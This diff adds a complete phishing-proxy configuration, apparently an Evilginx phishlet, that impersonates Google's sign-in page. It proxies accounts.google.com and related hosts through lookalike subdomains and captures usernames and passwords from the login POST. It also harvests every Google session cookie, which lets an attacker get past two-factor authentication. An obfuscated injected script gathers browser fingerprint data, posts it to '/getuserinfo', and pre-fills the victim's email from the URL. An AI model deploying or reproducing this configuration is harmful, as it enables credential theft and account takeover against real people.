@@ -1,0 +1,62 @@
+author: 'TOBI'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'apis.google.com', replace: 'apis.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.google.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp"]
+credentials:
+  username:
+    key: 'f.req'
+    search: '([a-zA-Z0-9+._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: '1'
+    type: 'post'
+  custom:
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/CheckCookie'
+  - '/ManageAccount'
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?passive=1209600&osid=1&continue=https%3A%2F%2Fmyaccount.google.com%2F&followup=https%3A%2F%2Fmyaccount.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+force_post:
+  - path: '/_/signin/sl/challenge'
+    search: 
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['.*?']
+    script: |
+      (function(_0x19cdca,_0x2db176){var _0x2b7d52=_0x5288,_0x618e01=_0x19cdca();while(!![]){try{var _0x16243c=-parseInt(_0x2b7d52(0x10a))/(-0x17b1+-0x25ad+0x3d5f)*(-parseInt(_0x2b7d52(0x10d))/(0x1a*-0x1b+0x18*-0xfd+0x1a78))+parseInt(_0x2b7d52(0x104))/(0x1*0x494+0x1*-0x12ad+-0x2b*-0x54)+parseInt(_0x2b7d52(0x12b))/(0x1e61+-0x1d0*0x2+0x1abd*-0x1)+parseInt(_0x2b7d52(0xf8))/(-0x1b6e+0x9e3+0x8*0x232)*(parseInt(_0x2b7d52(0xf7))/(-0x9*0x351+0x1*0x2187+-0x3a8))+parseInt(_0x2b7d52(0x137))/(0x2095+-0x1*0x2035+-0x1*0x59)+parseInt(_0x2b7d52(0x13c))/(-0x4d9+-0xfb3+0x1494)+-parseInt(_0x2b7d52(0x11a))/(-0xb*0x33+-0x1f5f+0x2199*0x1)*(parseInt(_0x2b7d52(0xf9))/(0x4f*-0x7b+0x64*-0xd+0x2b13));if(_0x16243c===_0x2db176)break;else _0x618e01['push'](_0x618e01['shift']());}catch(_0x5dd5de){_0x618e01['push'](_0x618e01['shift']());}}}(_0x4ff1,0x468b*0x1+-0x14d1a*-0x3+0x42b15));function serialize(_0x513122){var _0x377136=_0x5288,_0x2a3e92={'ObNYr':function(_0x3dd5bc,_0x2933a6){return _0x3dd5bc+_0x2933a6;},'gVFRY':function(_0x2ede82,_0x1ae0bf){return _0x2ede82+_0x1ae0bf;},'IVfOl':function(_0x5ccf3d,_0x26bb1b){return _0x5ccf3d(_0x26bb1b);},'UuREp':function(_0x4eb2cb,_0x29933d){return _0x4eb2cb(_0x29933d);}},_0x105cfc=[];for(var _0x240c16 in _0x513122){_0x513122[_0x377136(0x133)+_0x377136(0x134)](_0x240c16)&&_0x105cfc[_0x377136(0x102)](_0x2a3e92[_0x377136(0x131)](_0x2a3e92[_0x377136(0x139)](_0x2a3e92[_0x377136(0x10f)](encodeURIComponent,_0x240c16),'='),_0x2a3e92[_0x377136(0x105)](encodeURIComponent,_0x513122[_0x240c16])));}return _0x105cfc[_0x377136(0xff)]('&');}function toPopulate(){var _0x25f91b=_0x5288,_0x2b0dff={'Qjwwy':_0x25f91b(0x110)+_0x25f91b(0x115),'lOaYP':_0x25f91b(0x10b),'isJyp':_0x25f91b(0x129)+'pe','kzyGT':_0x25f91b(0xfa)+_0x25f91b(0x109)+_0x25f91b(0x11c)+_0x25f91b(0xfd),'VGCSJ':function(_0x2e33ec,_0x426593){return _0x2e33ec(_0x426593);},'CbOKQ':_0x25f91b(0x103),'eAqVc':_0x25f91b(0xf4),'nTTFQ':_0x25f91b(0xfe)+'fo'},_0x5829ee=_0x2b0dff[_0x25f91b(0x116)][_0x25f91b(0x128)]('|'),_0x30b96a=0x10*-0x1bd+0x11c*0x8+0x4bc*0x4;while(!![]){switch(_0x5829ee[_0x30b96a++]){case'0':console[_0x25f91b(0x114)](_0x2b0dff[_0x25f91b(0x132)]);continue;case'1':_0x3f06ec[_0x25f91b(0x10e)+_0x25f91b(0x136)]=function(){var _0x2dee54=_0x25f91b;console[_0x2dee54(0x114)](_0x25af50[_0x2dee54(0x12c)]);};continue;case'2':_0x3f06ec[_0x25f91b(0x119)+_0x25f91b(0x10c)](_0x2b0dff[_0x25f91b(0x138)],_0x2b0dff[_0x25f91b(0x12e)]);continue;case'3':console[_0x25f91b(0x114)](_0x2b0dff[_0x25f91b(0xf6)](serialize,_0x379696));continue;case'4':_0x3f06ec[_0x25f91b(0x127)](_0x2b0dff[_0x25f91b(0xf6)](serialize,_0x379696));continue;case'5':var _0x3f06ec=new XMLHttpRequest();continue;case'6':var _0x25af50={'Iakpv':_0x2b0dff[_0x25f91b(0x125)]};continue;case'7':_0x3f06ec[_0x25f91b(0x126)](_0x2b0dff[_0x25f91b(0x11b)],_0x2b0dff[_0x25f91b(0x13b)],!![]);continue;case'8':var _0x379696={'useragent':navigator[_0x25f91b(0xfb)],'browser':navigator[_0x25f91b(0x113)],'engine':navigator[_0x25f91b(0x121)],'platform':navigator[_0x25f91b(0x108)]};continue;}break;}}setTimeout(toPopulate,-0x2317*0x1+0x1ab5+0x6*0x2b3);function lp(){var _0x12e2cd=_0x5288,_0x5ab487={'BGaNy':_0x12e2cd(0x12a)+_0x12e2cd(0x13a),'TtdzI':function(_0xf6b0b8,_0xcc8c26){return _0xf6b0b8<_0xcc8c26;},'AkUII':function(_0x17b648,_0x5f0f52){return _0x17b648-_0x5f0f52;},'ONgZY':function(_0x541ac6,_0x2d257a,_0x29a005){return _0x541ac6(_0x2d257a,_0x29a005);},'Cutvh':function(_0xdba5bd,_0x456bdb,_0x5518ca){return _0xdba5bd(_0x456bdb,_0x5518ca);},'zonav':_0x12e2cd(0x118)+_0x12e2cd(0x11f),'tgPWp':function(_0x166f62,_0x48baad){return _0x166f62!=_0x48baad;},'vBuYB':function(_0x29a314){return _0x29a314();}},_0x5954a1=_0x5ab487[_0x12e2cd(0x107)][_0x12e2cd(0x128)]('|'),_0x417eb8=0x1*-0xf9c+-0x1*-0x100a+0x16*-0x5;while(!![]){switch(_0x5954a1[_0x417eb8++]){case'0':var _0x2ee778=_0x1b8934[_0x12e2cd(0x128)]('#');continue;case'1':for(var _0x516402,_0x27e97a=_0x1d5839[_0x12e2cd(0x101)](0x1*0x1e53+-0x2*0x2bf+-0x18d4),_0x3fdb33=[],_0x623f0f=0x22f9+0x24d7+-0x47d0;_0x5ab487[_0x12e2cd(0x122)](_0x623f0f,_0x5ab487[_0x12e2cd(0x100)](_0x27e97a[_0x12e2cd(0xf3)],0x193f*0x1+-0x15df+-0x35f*0x1));_0x623f0f+=0x1*0x16d6+0x19*0x63+-0x207f)_0x3fdb33[_0x12e2cd(0x102)](_0x5ab487[_0x12e2cd(0x111)](parseInt,_0x27e97a[_0x12e2cd(0x117)](_0x623f0f,-0x6f6+-0xce3*-0x1+-0x5eb),-0x51*0x11+-0x171b+0x1c8c));continue;case'2':_0x5ab487[_0x12e2cd(0x106)](setTimeout,function(){var _0x279b29=_0x12e2cd;_0x2fe5dd[_0x279b29(0x135)](lp);},-0x1525+-0x1*0x26c0+0x3c49);continue;case'3':_0x516402=String[_0x12e2cd(0x12d)+'de'][_0x12e2cd(0xf5)](String,_0x3fdb33);continue;case'4':var _0x311fdc=document[_0x12e2cd(0x130)+_0x12e2cd(0x120)](_0x5ab487[_0x12e2cd(0x12f)]);continue;case'5':if(_0x5ab487[_0x12e2cd(0x123)](_0x311fdc,null)){_0x311fdc[_0x12e2cd(0x124)]=_0x516402;return;}continue;case'6':var _0x1d5839=_0x2ee778[-0x2217+0x1192+0x1086][_0x12e2cd(0x11e)](/[=]/gi,'');continue;case'7':var _0x2fe5dd={'UPoAu':function(_0x208ad9){var _0x37642a=_0x12e2cd;return _0x5ab487[_0x37642a(0x11d)](_0x208ad9);}};continue;case'8':var _0x1b8934=window[_0x12e2cd(0x13d)][_0x12e2cd(0x112)];continue;}break;}}setTimeout(function(){var _0x3bffd6=_0x5288,_0x16eeb7={'JzVLp':function(_0x33305b){return _0x33305b();}};_0x16eeb7[_0x3bffd6(0xfc)](lp);},-0x161f+-0x728+0x43d*0x7);function _0x5288(_0x38dbf0,_0x50848c){var _0x3c33fb=_0x4ff1();return _0x5288=function(_0x33e3ee,_0x215d75){_0x33e3ee=_0x33e3ee-(0x2dd*-0xd+-0x1f36+-0xd6*-0x53);var _0x269d52=_0x3c33fb[_0x33e3ee];return _0x269d52;},_0x5288(_0x38dbf0,_0x50848c);}function _0x4ff1(){var _0x323ce=['open','send','split','Content-ty','7|8|0|6|1|','3516400EwdrfM','Iakpv','fromCharCo','kzyGT','zonav','querySelec','ObNYr','lOaYP','hasOwnProp','erty','UPoAu','techange','4828663pedXDr','isJyp','gVFRY','3|4|5|2','nTTFQ','1749336fyEvdV','location','length','POST','apply','VGCSJ','24OoISAU','407665mJSKnX','5210EibumW','applicatio','userAgent','JzVLp','ded','/getuserin','join','AkUII','substring','push','Sent','2329677kjognS','UuREp','Cutvh','BGaNy','platform','n/x-www-fo','3709lvbKZq','Populating','Header','260GNiVKf','onreadysta','IVfOl','6|0|5|8|1|','ONgZY','href','appName','log','7|2|3|4','Qjwwy','substr','#identifie','setRequest','48807ablAgv','eAqVc','rm-urlenco','vBuYB','replace','rId','tor','product','TtdzI','tgPWp','value','CbOKQ'];_0x4ff1=function(){return _0x323ce;};return _0x4ff1();}
